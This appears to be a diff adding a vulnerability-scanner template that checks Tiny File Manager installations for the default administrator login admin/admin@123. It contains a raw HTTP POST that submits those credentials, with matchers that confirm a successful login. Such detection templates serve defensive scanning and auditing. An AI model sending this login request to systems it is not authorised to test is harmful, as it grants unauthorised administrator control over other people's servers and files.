@@ -1,0 +1,35 @@
+id: tiny-file-manager-weak-pass
+info:
+  name: Weak Password Vulnerability in Tiny File Manager
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Tiny File Manager is an open-source web-based file manager. It has a default password vulnerability, allowing attackers to control the entire platform using the default credentials admin/admin@123, thereby gaining administrator rights and accessing core functions.
+  tags: default-password
+  reference:
+    - https://github.com/prasathmani/tinyfilemanager
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
+
+        fm_usr=admin&fm_pwd=admin%40123
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "/index.php?p="
+          - "filemanager="
+      - type: word
+        part: body
+        words:
+          - ""
+        condition: and
